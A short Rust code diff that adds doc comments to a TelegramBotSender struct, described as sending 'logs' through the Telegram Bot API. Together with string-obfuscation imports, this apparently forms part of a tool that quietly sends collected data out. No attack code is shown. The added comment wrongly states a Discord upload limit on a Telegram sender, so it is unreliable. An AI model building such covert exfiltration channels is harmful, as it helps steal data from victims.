@@ -10,6 +10,15 @@ use obfstr::obfstr as s;
 use requests::{write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
 use utils::format_size;
 
+/// A log sender that transmits data via a Telegram bot using the Bot API.
+///
+/// # Fields
+///
+/// - `chat_id`: The unique identifier of the target Telegram chat or channel (as a string).
+/// - `token`: The bot token obtained from [BotFather](https://t.me/BotFather).
+/// # Notes
+///
+/// - Discord has a file upload limit of 2 GB per file.
 #[derive(new, Clone)]
 pub struct TelegramBotSender {
     chat_id: Arc<str>,
